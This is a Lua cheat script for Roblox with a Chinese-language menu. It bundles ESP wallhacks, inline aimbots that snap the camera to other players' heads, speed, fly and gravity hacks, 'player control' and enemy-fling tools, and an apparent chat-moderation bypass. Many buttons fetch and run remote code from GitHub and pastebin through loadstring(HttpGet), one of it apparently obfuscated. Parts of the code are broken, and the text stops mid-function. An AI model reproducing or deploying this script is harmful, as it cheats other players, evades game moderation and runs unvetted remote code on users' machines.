local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/Orion/main/source"))()
local LBLG = Instance.new("ScreenGui", getParent)
local LBL = Instance.new("TextLabel", getParent)
local player = game.Players.LocalPlayer

LBLG.Name = "LBLG"
LBLG.Parent = game.CoreGui
LBLG.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
LBLG.Enabled = true
LBL.Name = "LBL"
LBL.Parent = LBLG
LBL.BackgroundColor3 = Color3.new(1, 1, 1)
LBL.BackgroundTransparency = 1
LBL.BorderColor3 = Color3.new(0, 0, 0)
LBL.Position = UDim2.new(0.75,0,0.010,0)
LBL.Size = UDim2.new(0, 133, 0, 30)
LBL.Font = Enum.Font.GothamSemibold
LBL.Text = "TextLabel"
LBL.TextColor3 = Color3.new(1, 1, 1)
LBL.TextScaled = true
LBL.TextSize = 14
LBL.TextWrapped = true
LBL.Visible = true

local FpsLabel = LBL
local Heartbeat = game:GetService("RunService").Heartbeat
local LastIteration, Start
local FrameUpdateTable = { }

local function HeartbeatUpdate()
	LastIteration = tick()
	for Index = #FrameUpdateTable, 1, -1 do
		FrameUpdateTable[Index + 1] = (FrameUpdateTable[Index] >= LastIteration - 1) and FrameUpdateTable[Index] or nil
	end
	FrameUpdateTable[1] = LastIteration
	local CurrentFPS = (tick() - Start >= 1 and #FrameUpdateTable) or (#FrameUpdateTable / (tick() - Start))
	CurrentFPS = CurrentFPS - CurrentFPS % 1
	FpsLabel.Text = ("北京时间:"..os.date("%H").."时"..os.date("%M").."分"..os.date("%S"))
end
Start = tick()
Heartbeat:Connect(HeartbeatUpdate)
local Window = OrionLib:MakeWindow({Name = "GM", HidePremium = false, SaveConfig = true,IntroText = "GM", ConfigFolder = "GM"})

game:GetService("StarterGui"):SetCore("SendNotification",{ Title = "GM"; Text ="GM"; Duration = 4; })

local about = Window:MakeTab({
    Name = "用户设置",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false

})

about:AddParagraph("仅为开发使用")
about:AddParagraph("仅开发者使用 测试工具")
about:AddParagraph("开发者：慢慢习惯 拔叔（冒泡）")
about:AddParagraph("请勿破坏游戏公平")

OrionLib:MakeNotification({
	Name = "GM",
	Content = "验证成功",
	Image = "rbxassetid://4483345998",
	Time = 2

})

local Tab = Window:MakeTab({

    Name = "透视后台",

    Icon = "rbxassetid://4483345998",

    PremiumOnly = false

})

local Section = Tab:AddSection({

	Name = "用户到期时间2014/12/1-2099/12/30"

})

Tab:AddSlider({

	Name = "速度",

	Min = 16,

	Max = 200,

	Default = 16,

	Color = Color3.fromRGB(255,255,255),

	Increment = 1,

	ValueName = "数值",

	Callback = function(Value)

		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value

	end    

})

Tab:AddSlider({

	Name = "跳跃高度",

	Min = 50,

	Max = 200,

	Default = 50,

	Color = Color3.fromRGB(255,255,255),

	Increment = 1,

	ValueName = "数值",

	Callback = function(Value)

		game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value

	end    

})

Tab:AddTextbox({

	Name = "跳跃高度设置",

	Default = "",

	TextDisappear = true,

	Callback = function(Value)

		game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value

	end

})

Tab:AddTextbox({

	Name = "移动速度设置",

	Default = "",

	TextDisappear = true,

	Callback = function(Value)

		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value

	end

})

Tab:AddTextbox({

	Name = "重力设置",

	Default = "",

	TextDisappear = true,

	Callback = function(Value)

		game.Workspace.Gravity = Value

	end

})

Tab:AddToggle({

	Name = "夜视",

	Default = false,

	Callback = function(Value)

		if Value then

		    game.Lighting.Ambient = Color3.new(1, 1, 1)

		else

		    game.Lighting.Ambient = Color3.new(0, 0, 0)

		end

	end

})

Tab:AddButton({

	Name = "绘制透视",

	Callback = function()

     loadstring(game:HttpGet(('https://raw.githubusercontent.com/cool83birdcarfly02six/UNIVERSALESPLTX/main/README.md'),true))()

  	end    

})

Tab:AddButton({

	Name = "ESP透视",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/2172098228q/15/refs/heads/main/ESP.txt"))()

  	end    

})

Tab:AddButton({

	Name = "自调自瞄",

	Callback = function()

     local fov = 100 local smoothness = 10 local crosshairDistance = 5 local RunService = game:GetService("RunService") local UserInputService = game:GetService("UserInputService") local Players = game:GetService("Players") local Cam = game.Workspace.CurrentCamera local FOVring = Drawing.new("Circle") FOVring.Visible = true FOVring.Thickness = 2 FOVring.Color = Color3.fromRGB(0, 255, 0) FOVring.Filled = false FOVring.Radius = fov FOVring.Position = Cam.ViewportSize / 2 local Player = Players.LocalPlayer local PlayerGui = Player:WaitForChild("PlayerGui") local ScreenGui = Instance.new("ScreenGui") ScreenGui.Name = "FovAdjustGui" ScreenGui.Parent = PlayerGui local Frame = Instance.new("Frame") Frame.Name = "MainFrame" Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30) Frame.BorderColor3 = Color3.fromRGB(128, 0, 128) Frame.BorderSizePixel = 2 Frame.Position = UDim2.new(0.3, 0, 0.3, 0) Frame.Size = UDim2.new(0.4, 0, 0.4, 0) Frame.Active = true Frame.Draggable = true Frame.Parent = ScreenGui local MinimizeButton = Instance.new("TextButton") MinimizeButton.Name = "MinimizeButton" MinimizeButton.Text = "-" MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255) MinimizeButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50) MinimizeButton.Position = UDim2.new(0.9, 0, 0, 0) MinimizeButton.Size = UDim2.new(0.1, 0, 0.1, 0) MinimizeButton.Parent = Frame local isMinimized = false MinimizeButton.MouseButton1Click:Connect(function() isMinimized = not isMinimized if isMinimized then Frame:TweenSize(UDim2.new(0.1, 0, 0.1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.3, true) MinimizeButton.Text = "+" else Frame:TweenSize(UDim2.new(0.4, 0, 0.4, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.3, true) MinimizeButton.Text = "-" end end) local FovLabel = Instance.new("TextLabel") FovLabel.Name = "FovLabel" FovLabel.Text = "自瞄范围" FovLabel.TextColor3 = Color3.fromRGB(255, 255, 255) FovLabel.BackgroundTransparency = 1 FovLabel.Position = UDim2.new(0.1, 0, 0.1, 0) FovLabel.Size = UDim2.new(0.8, 0, 0.2, 0) FovLabel.Parent = Frame local FovSlider = Instance.new("TextBox") FovSlider.Name = "FovSlider" FovSlider.Text = tostring(fov) FovSlider.TextColor3 = Color3.fromRGB(255, 255, 255) FovSlider.BackgroundColor3 = Color3.fromRGB(50, 50, 50) FovSlider.Position = UDim2.new(0.1, 0, 0.3, 0) FovSlider.Size = UDim2.new(0.8, 0, 0.2, 0) FovSlider.Parent = Frame local SmoothnessLabel = Instance.new("TextLabel") SmoothnessLabel.Name = "SmoothnessLabel" SmoothnessLabel.Text = "自瞄平滑度" SmoothnessLabel.TextColor3 = Color3.fromRGB(255, 255, 255) SmoothnessLabel.BackgroundTransparency = 1 SmoothnessLabel.Position = UDim2.new(0.1, 0, 0.5, 0) SmoothnessLabel.Size = UDim2.new(0.8, 0, 0.2, 0) SmoothnessLabel.Parent = Frame local SmoothnessSlider = Instance.new("TextBox") SmoothnessSlider.Name = "SmoothnessSlider" SmoothnessSlider.Text = tostring(smoothness) SmoothnessSlider.TextColor3 = Color3.fromRGB(255, 255, 255) SmoothnessSlider.BackgroundColor3 = Color3.fromRGB(50, 50, 50) SmoothnessSlider.Position = UDim2.new(0.1, 0, 0.7, 0) SmoothnessSlider.Size = UDim2.new(0.8, 0, 0.2, 0) SmoothnessSlider.Parent = Frame local CrosshairDistanceLabel = Instance.new("TextLabel") CrosshairDistanceLabel.Name = "CrosshairDistanceLabel" CrosshairDistanceLabel.Text = "自瞄预判距离" CrosshairDistanceLabel.TextColor3 = Color3.fromRGB(255, 255, 255) CrosshairDistanceLabel.BackgroundTransparency = 1 CrosshairDistanceLabel.Position = UDim2.new(0.1, 0, 0.9, 0) CrosshairDistanceLabel.Size = UDim2.new(0.8, 0, 0.2, 0) CrosshairDistanceLabel.Parent = Frame local CrosshairDistanceSlider = Instance.new("TextBox") CrosshairDistanceSlider.Name = "CrosshairDistanceSlider" CrosshairDistanceSlider.Text = tostring(crosshairDistance) CrosshairDistanceSlider.TextColor3 = Color3.fromRGB(255, 255, 255) CrosshairDistanceSlider.BackgroundColor3 = Color3.fromRGB(50, 50, 50) CrosshairDistanceSlider.Position = UDim2.new(0.1, 0, 1.1, 0) CrosshairDistanceSlider.Size = UDim2.new(0.8, 0, 0.2, 0) CrosshairDistanceSlider.Parent = Frame local targetCFrame = Cam.CFrame local function updateDrawings() local camViewportSize = Cam.ViewportSize FOVring.Position = camViewportSize / 2 FOVring.Radius = fov end local function onKeyDown(input) if input.KeyCode == Enum.KeyCode.Delete then RunService:UnbindFromRenderStep("FOVUpdate") FOVring:Remove() end end UserInputService.InputBegan:Connect(onKeyDown) local function getClosestPlayerInFOV(trg_part) local nearest = nil local last = math.huge local playerMousePos = Cam.ViewportSize / 2 for _, player in ipairs(Players:GetPlayers()) do if player ~= Players.LocalPlayer then local part = player.Character and player.Character:FindFirstChild(trg_part) if part then local ePos, isVisible = Cam:WorldToViewportPoint(part.Position) local distance = (Vector2.new(ePos.x, ePos.y) - playerMousePos).Magnitude if distance < last and isVisible and distance < fov then last = distance nearest = player end end end end return nearest end RunService.RenderStepped:Connect(function() updateDrawings() local closest = getClosestPlayerInFOV("Head") if closest and closest.Character:FindFirstChild("Head") then local targetCharacter = closest.Character local targetHead = targetCharacter.Head local targetRootPart = targetCharacter:FindFirstChild("HumanoidRootPart") local isMoving = targetRootPart.Velocity.Magnitude > 0.1 local targetPosition if isMoving then targetPosition = targetHead.Position + (targetHead.CFrame.LookVector * crosshairDistance) else targetPosition = targetHead.Position end targetCFrame = CFrame.new(Cam.CFrame.Position, targetPosition) else targetCFrame = Cam.CFrame end Cam.CFrame = Cam.CFrame:Lerp(targetCFrame, 1 / smoothness) end) FovSlider.FocusLost:Connect(function(enterPressed, inputThatCausedFocusLoss) if enterPressed then local newFov = tonumber(FovSlider.Text) if newFov then fov = newFov else FovSlider.Text = tostring(fov) end end end) SmoothnessSlider.FocusLost:Connect(function(enterPressed, inputThatCausedFocusLoss) if enterPressed then local newSmoothness = tonumber(SmoothnessSlider.Text) if newSmoothness then smoothness = newSmoothness else SmoothnessSlider.Text = tostring(smoothness) end end end) CrosshairDistanceSlider.FocusLost:Connect(function(enterPressed, inputThatCausedFocusLoss) if enterPressed then local newCrosshairDistance = tonumber(CrosshairDistanceSlider.Text) if newCrosshairDistance then crosshairDistance = newCrosshairDistance else CrosshairDistanceSlider.Text = tostring(crosshairDistance) end end end)

  	end    

})

Tab:AddButton({

	Name = "正常自瞄",

	Callback = function()

     local fov = 75
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local Cam = game.Workspace.CurrentCamera
 
local FOVring = Drawing.new("Circle")
FOVring.Visible = true
FOVring.Thickness = 2
FOVring.Color = Color3.fromRGB(0, 0, 0) -- black color
FOVring.Filled = false
FOVring.Radius = fov
FOVring.Position = Cam.ViewportSize / 2
 
local function updateDrawings()
    local camViewportSize = Cam.ViewportSize
    FOVring.Position = camViewportSize / 2
end
 
local function onKeyDown(input)
    if input.KeyCode == Enum.KeyCode.Delete then
        RunService:UnbindFromRenderStep("FOVUpdate")
        FOVring:Remove()
    end
end
 
UserInputService.InputBegan:Connect(onKeyDown)
 
local function lookAt(target)
    local lookVector = (target - Cam.CFrame.Position).unit
    local newCFrame = CFrame.new(Cam.CFrame.Position, Cam.CFrame.Position + lookVector)
    Cam.CFrame = newCFrame
end
 
local function getClosestPlayerInFOV(trg_part)
    local nearest = nil
    local last = math.huge
    local playerMousePos = Cam.ViewportSize / 2
 
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= Players.LocalPlayer then
            local part = player.Character and player.Character:FindFirstChild(trg_part)
            if part then
                local ePos, isVisible = Cam:WorldToViewportPoint(part.Position)
                local distance = (Vector2.new(ePos.x, ePos.y) - playerMousePos).Magnitude
 
                if distance < last and isVisible and distance < fov then
                    last = distance
                    nearest = player
                end
            end
        end
    end
 
    return nearest
end
 
RunService.RenderStepped:Connect(function()
    updateDrawings()
    local closest = getClosestPlayerInFOV("Head")
    if closest and closest.Character:FindFirstChild("Head") then
        lookAt(closest.Character.Head.Position)
    end
end)

  	end    

})

Tab:AddButton({

	Name = "阿尔子追",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/dingding123hhh/sgbs/main/%E4%B8%81%E4%B8%81%20%E6%B1%89%E5%8C%96%E8%87%AA%E7%9E%84.txt"))()

  	end    

})

local Tab = Window:MakeTab({

    Name = "指令后台",

    Icon = "rbxassetid://4483345998",

    PremiumOnly = false

})

Tab:AddButton({

	Name = "伪装黑客（推荐）",

	Callback = function()

     loadstring(game:HttpGet("https://pastebin.com/raw/6X72Mdfs"))()

  	end    

})

Tab:AddButton({

	Name = "提升流畅",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/gclich/FPS-X-GUI/main/FPS_X.lua"))()

  	end    

})

Tab:AddButton({

	Name = "高清光影 ",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/MZEEN2424/Graphics/main/Graphics.xml"))()

  	end    

})

Tab:AddButton({

	Name = "车子飞天",

	Callback = function()

     local Speed = 30

	-- Gui to Lua
	-- Version: 3.2
	local HumanoidRP = game.Players.LocalPlayer.Character.HumanoidRootPart
	-- Instances:

	local ScreenGui = Instance.new("ScreenGui")
	local W = Instance.new("TextButton")
	local S = Instance.new("TextButton")
	local A = Instance.new("TextButton")
	local D = Instance.new("TextButton")
	local Fly = Instance.new("TextButton")
	local unfly = Instance.new("TextButton")
	local StopFly = Instance.new("TextButton")

	--Properties:

	ScreenGui.Parent = game.CoreGui
	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

	unfly.Name = "关闭飞行"
	unfly.Parent = ScreenGui
	unfly.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	unfly.Position = UDim2.new(0.694387913, 0, 0.181818187, 0)
	unfly.Size = UDim2.new(0, 72, 0, 50)
	unfly.Font = Enum.Font.SourceSans
	unfly.Text = "关闭飞行"
	unfly.TextColor3 = Color3.fromRGB(170, 0, 255)
	unfly.TextScaled = true
	unfly.TextSize = 14.000
	unfly.TextWrapped = 
		unfly.MouseButton1Down:Connect(function()
		HumanoidRP:FindFirstChildOfClass("BodyVelocity"):Destroy()
		HumanoidRP:FindFirstChildOfClass("BodyGyro"):Destroy()
	end)

	StopFly.Name = "暂停飞行"
	StopFly.Parent = ScreenGui
	StopFly.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	StopFly.Position = UDim2.new(0.695689976, 0, 0.0213903747, 0)
	StopFly.Size = UDim2.new(0, 71, 0, 50)
	StopFly.Font = Enum.Font.SourceSans
	StopFly.Text = "暂停飞行"
	StopFly.TextColor3 = Color3.fromRGB(170, 0, 255)
	StopFly.TextScaled = true
	StopFly.TextSize = 14.000
	StopFly.TextWrapped = true
	StopFly.MouseButton1Down:Connect(function()
		HumanoidRP.Anchored = true
	end)

	Fly.Name = "飞行"
	Fly.Parent = ScreenGui
	Fly.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	Fly.Position = UDim2.new(0.588797748, 0, 0.0213903747, 0)
	Fly.Size = UDim2.new(0, 66, 0, 50)
	Fly.Font = Enum.Font.SourceSans
	Fly.Text = "飞行"
	Fly.TextColor3 = Color3.fromRGB(170, 0, 127)
	Fly.TextScaled = true
	Fly.TextSize = 14.000
	Fly.TextWrapped = true
	Fly.MouseButton1Down:Connect(function()
		local BV = Instance.new("BodyVelocity",HumanoidRP)
		local BG = Instance.new("BodyGyro",HumanoidRP)
		BG.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
		BG.D = 5000
		BG.P = 50000
		BG.CFrame = game.Workspace.CurrentCamera.CFrame
		BV.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
	end)

	W.Name = "W"
	W.Parent = ScreenGui
	W.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	W.Position = UDim2.new(0.161668837, 0, 0.601604283, 0)
	W.Size = UDim2.new(0, 58, 0, 50)
	W.Font = Enum.Font.SourceSans
	W.Text = "↑"
	W.TextColor3 = Color3.fromRGB(226, 226, 526)
	W.TextScaled = true
	W.TextSize = 5.000
	W.TextWrapped = true
	W.MouseButton1Down:Connect(function()
		HumanoidRP.Anchored = false
		HumanoidRP:FindFirstChildOfClass("BodyVelocity"):Destroy()
		HumanoidRP:FindFirstChildOfClass("BodyGyro"):Destroy()
		wait(.1)
		local BV = Instance.new("BodyVelocity",HumanoidRP)
		local BG = Instance.new("BodyGyro",HumanoidRP)
		BG.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
		BG.D = 50000
		BG.P = 50000
		BG.CFrame = game.Workspace.CurrentCamera.CFrame
		BV.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
		BV.Velocity = game.Workspace.CurrentCamera.CFrame.LookVector * Speed
	end)


	S.Name = "S"
	S.Parent = ScreenGui
	S.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	S.Position = UDim2.new(0.161668837, 0, 0.735294104, 0)
	S.Size = UDim2.new(0, 58, 0, 50)
	S.Font = Enum.Font.SourceSans
	S.Text = "↓"
	S.TextColor3 = Color3.fromRGB(255, 255, 255)
	S.TextScaled = true
	S.TextSize = 14.000
	S.TextWrapped = true
	S.MouseButton1Down:Connect(function()
		HumanoidRP.Anchored = false
		HumanoidRP:FindFirstChildOfClass("BodyVelocity"):Destroy()
		HumanoidRP:FindFirstChildOfClass("BodyGyro"):Destroy()
		wait(.1)
		local BV = Instance.new("BodyVelocity",HumanoidRP)
		local BG = Instance.new("BodyGyro",HumanoidRP)
		BG.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
		BG.D = 5000
		BG.P = 50000
		BG.CFrame = game.Workspace.CurrentCamera.CFrame
		BV.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
		BV.Velocity = game.Workspace.CurrentCamera.CFrame.LookVector * -Speed
	end)

  	end    

})

Tab:AddButton({

	Name = "车子飞天（超快）",

	Callback = function()

     local Speed = 491

	-- Gui to Lua
	-- Version: 3.2
	local HumanoidRP = game.Players.LocalPlayer.Character.HumanoidRootPart
	-- Instances:

	local ScreenGui = Instance.new("ScreenGui")
	local W = Instance.new("TextButton")
	local S = Instance.new("TextButton")
	local A = Instance.new("TextButton")
	local D = Instance.new("TextButton")
	local Fly = Instance.new("TextButton")
	local unfly = Instance.new("TextButton")
	local StopFly = Instance.new("TextButton")

	--Properties:

	ScreenGui.Parent = game.CoreGui
	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

	unfly.Name = "unfly"
	unfly.Parent = ScreenGui
	unfly.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	unfly.Position = UDim2.new(0.694387913, 0, 0.181818187, 0)
	unfly.Size = UDim2.new(0, 72, 0, 50)
	unfly.Font = Enum.Font.SourceSans
	unfly.Text = "取消飞"
	unfly.TextColor3 = Color3.fromRGB(170, 0, 255)
	unfly.TextScaled = true
	unfly.TextSize = 14.000
	unfly.TextWrapped = 
		unfly.MouseButton1Down:Connect(function()
		HumanoidRP:FindFirstChildOfClass("BodyVelocity"):Destroy()
		HumanoidRP:FindFirstChildOfClass("BodyGyro"):Destroy()
	end)

	StopFly.Name = "Stop Fly"
	StopFly.Parent = ScreenGui
	StopFly.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	StopFly.Position = UDim2.new(0.695689976, 0, 0.0213903747, 0)
	StopFly.Size = UDim2.new(0, 71, 0, 50)
	StopFly.Font = Enum.Font.SourceSans
	StopFly.Text = "定住"
	StopFly.TextColor3 = Color3.fromRGB(170, 0, 255)
	StopFly.TextScaled = true
	StopFly.TextSize = 14.000
	StopFly.TextWrapped = true
	StopFly.MouseButton1Down:Connect(function()
		HumanoidRP.Anchored = true
	end)

	Fly.Name = "Fly"
	Fly.Parent = ScreenGui
	Fly.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	Fly.Position = UDim2.new(0.588797748, 0, 0.0213903747, 0)
	Fly.Size = UDim2.new(0, 66, 0, 50)
	Fly.Font = Enum.Font.SourceSans
	Fly.Text = "飞"
	Fly.TextColor3 = Color3.fromRGB(170, 0, 127)
	Fly.TextScaled = true
	Fly.TextSize = 14.000
	Fly.TextWrapped = true
	Fly.MouseButton1Down:Connect(function()
		local BV = Instance.new("BodyVelocity",HumanoidRP)
		local BG = Instance.new("BodyGyro",HumanoidRP)
		BG.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
		BG.D = 5000
		BG.P = 50000
		BG.CFrame = game.Workspace.CurrentCamera.CFrame
		BV.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
	end)

	W.Name = "W"
	W.Parent = ScreenGui
	W.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	W.Position = UDim2.new(0.161668837, 0, 0.601604283, 0)
	W.Size = UDim2.new(0, 58, 0, 50)
	W.Font = Enum.Font.SourceSans
	W.Text = "前"
	W.TextColor3 = Color3.fromRGB(226, 226, 226)
	W.TextScaled = true
	W.TextSize = 5.000
	W.TextWrapped = true
	W.MouseButton1Down:Connect(function()
		HumanoidRP.Anchored = false
		HumanoidRP:FindFirstChildOfClass("BodyVelocity"):Destroy()
		HumanoidRP:FindFirstChildOfClass("BodyGyro"):Destroy()
		wait(.1)
		local BV = Instance.new("BodyVelocity",HumanoidRP)
		local BG = Instance.new("BodyGyro",HumanoidRP)
		BG.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
		BG.D = 5000
		BG.P = 50000
		BG.CFrame = game.Workspace.CurrentCamera.CFrame
		BV.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
		BV.Velocity = game.Workspace.CurrentCamera.CFrame.LookVector * Speed
	end)


	S.Name = "S"
	S.Parent = ScreenGui
	S.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	S.Position = UDim2.new(0.161668837, 0, 0.735294104, 0)
	S.Size = UDim2.new(0, 58, 0, 50)
	S.Font = Enum.Font.SourceSans
	S.Text = "后"
	S.TextColor3 = Color3.fromRGB(255, 255, 255)
	S.TextScaled = true
	S.TextSize = 14.000
	S.TextWrapped = true
	S.MouseButton1Down:Connect(function()
		HumanoidRP.Anchored = false
		HumanoidRP:FindFirstChildOfClass("BodyVelocity"):Destroy()
		HumanoidRP:FindFirstChildOfClass("BodyGyro"):Destroy()
		wait(.1)
		local BV = Instance.new("BodyVelocity",HumanoidRP)
		local BG = Instance.new("BodyGyro",HumanoidRP)
		BG.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
		BG.D = 5000
		BG.P = 50000
		BG.CFrame = game.Workspace.CurrentCamera.CFrame
		BV.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
		BV.Velocity = game.Workspace.CurrentCamera.CFrame.LookVector * -Speed
	end)


  	end    

})

Tab:AddButton({

	Name = "防止掉线",

	Callback = function()

     	print("Anti Afk On")

		local vu = game:GetService("VirtualUser")

		game:GetService("Players").LocalPlayer.Idled:connect(function()

		   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)

		   wait(1)

		   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)

		end)

  	end    

})

Tab:AddButton({

	Name = "人物飞行",

	loadstring(game:HttpGet("https://raw.githubusercontent.com/2172098228q/12/refs/heads/main/B%E7%AB%99SASPOL%E7%8B%AC%E5%AE%B6%E9%A3%9E%E8%A1%8C%E8%84%9A%E6%9C%AC%EF%BC%88%E6%82%B2%EF%BC%89.txt"))()

  	end    

})

Tab:AddButton({

	Name = "阿尔飞行",

	Callback = function()

     loadstring(game:HttpGet("https://pastebin.com/raw/5zJu3hfN"))()

  	end    

})

Tab:AddButton({

	Name = "Fc指令",

	Callback = function()

     loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()

  	end    

})

Tab:AddButton({

	Name = "进入提示",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/boyscp/scriscriptsc/main/bbn.lua"))()

  	end    

})

Tab:AddButton({

	Name = "立刻死亡",

	Callback = function()

     game.Players.LocalPlayer.Character.Humanoid.Health=0

  	end    

})

Tab:AddButton({

	Name = "骂人无违规",

	Callback = function()

     loadstring(game:GetObjects("rbxassetid://1262435912")[1].Source)()

  	end    

})

Tab:AddButton({

	Name = "玩家控制",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/2172098228q/13/refs/heads/main/%E7%8E%A9%E5%AE%B6%E6%8E%A7%E5%88%B6%20%E6%B1%89%E5%8C%96.txt"))()

  	end    

})

Tab:AddButton({

	Name = "人物踏空",

	Callback = function()

     loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Float'))()

  	end    

})

Tab:AddButton({

	Name = "人物铁拳",

	Callback = function()

     loadstring(game:HttpGet('https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt'))()

  	end    

})

Tab:AddButton({

	Name = "直升机旋转",

	Callback = function()

     if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
spawn(function()
local speaker = game.Players.LocalPlayer
local Anim = Instance.new("Animation")
     Anim.AnimationId = "rbxassetid://27432686"
     local bruh = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
bruh:Play()
bruh:AdjustSpeed(0)
speaker.Character.Animate.Disabled = true
local hi = Instance.new("Sound")
hi.Name = "Sound"
hi.SoundId = "http://www.roblox.com/asset/?id=165113352"
hi.Volume = 2
hi.Looped = true
hi.archivable = false
hi.Parent = game.Workspace
hi:Play()

local spinSpeed = 40
local Spin = Instance.new("BodyAngularVelocity")
Spin.Name = "Spinning"
Spin.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
Spin.MaxTorque = Vector3.new(0, math.huge, 0)
Spin.AngularVelocity = Vector3.new(0,spinSpeed,0)

end)
else
spawn(function()
local speaker = game.Players.LocalPlayer
local Anim = Instance.new("Animation")
     Anim.AnimationId = "rbxassetid://507776043"
     local bruh = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
bruh:Play()
bruh:AdjustSpeed(0)
speaker.Character.Animate.Disabled = true
local hi = Instance.new("Sound")
hi.Name = "Sound"
hi.SoundId = "http://www.roblox.com/asset/?id=165113352"
hi.Volume = 2
hi.Looped = true
hi.archivable = false
hi.Parent = game.Workspace
hi:Play()

local spinSpeed = 40
local Spin = Instance.new("BodyAngularVelocity")
Spin.Name = "Spinning"
Spin.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
Spin.MaxTorque = Vector3.new(0, math.huge, 0)
Spin.AngularVelocity = Vector3.new(0,spinSpeed,0)


end)    
end
local Mouse = game:GetService("Players").LocalPlayer:GetMouse()
local u = game.Players.LocalPlayer
local urchar = u.Character

task.spawn(function()


qUp = Mouse.KeyUp:Connect(function(KEY)
if KEY == 'q' then
urchar.Humanoid.HipHeight = urchar.Humanoid.HipHeight - 3
end
end)
eUp = Mouse.KeyUp:Connect(function(KEY)
if KEY == 'e' then
urchar.Humanoid.HipHeight = urchar.Humanoid.HipHeight + 3
end
end)


end)

  	end    

})

Tab:AddButton({

	Name = "甩飞敌人",

	Callback = function()

     loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()

  	end    

})

Tab:AddButton({

	Name = "灵魂出窍",

	Callback = function()

     for i, v in pairs(game.CoreGui:GetChildren()) do
    if v:FindFirstChild("UI") then
        v:Destroy()
    end
end
wait(1)

local UI = Instance.new("ScreenGui")
local Main = Instance.new("ImageLabel")
local Toggle = Instance.new("ImageLabel")
local Button = Instance.new("TextButton")
local Circle = Instance.new("ImageLabel")
local InvisText = Instance.new("TextLabel")
local Credits = Instance.new("TextLabel")

--Properties:

UI.Name = "UI"
UI.Parent = game:WaitForChild("CoreGui")

Main.Name = "Main"
Main.Parent = UI
Main.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
Main.BackgroundTransparency = 1.000
Main.Position = UDim2.new(0.5, -75, 0.41232878, -37)
Main.Size = UDim2.new(0, 248, 0, 107)
Main.Image = "rbxassetid://3570695787"
Main.ImageColor3 = Color3.fromRGB(48, 48, 48)
Main.ScaleType = Enum.ScaleType.Slice
Main.SliceCenter = Rect.new(100, 100, 100, 100)
Main.SliceScale = 0.120

Toggle.Name = "Toggle"
Toggle.Parent = Main
Toggle.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
Toggle.BackgroundTransparency = 1.000
Toggle.Position = UDim2.new(0.5, -23, 0.565420568, -11)
Toggle.Size = UDim2.new(0, 46, 0, 22)
Toggle.Image = "rbxassetid://3570695787"
Toggle.ImageColor3 = Color3.fromRGB(200, 200, 200)
Toggle.ScaleType = Enum.ScaleType.Slice
Toggle.SliceCenter = Rect.new(100, 100, 100, 100)
Toggle.SliceScale = 0.120

Button.Name = "Button"
Button.Parent = Toggle
Button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Button.BackgroundTransparency = 1.000
Button.Size = UDim2.new(1, 0, 1, 0)
Button.Font = Enum.Font.SourceSans
Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Button.TextSize = 14.000
Button.TextTransparency = 1.000

local toggled = false
local debounce = false

Button.MouseButton1Click:Connect(
    function()
        if debounce == false then
            if toggled == true then
                debounce = true
                game:GetService("TweenService"):Create(
                    Toggle,
                    TweenInfo.new(0.25),
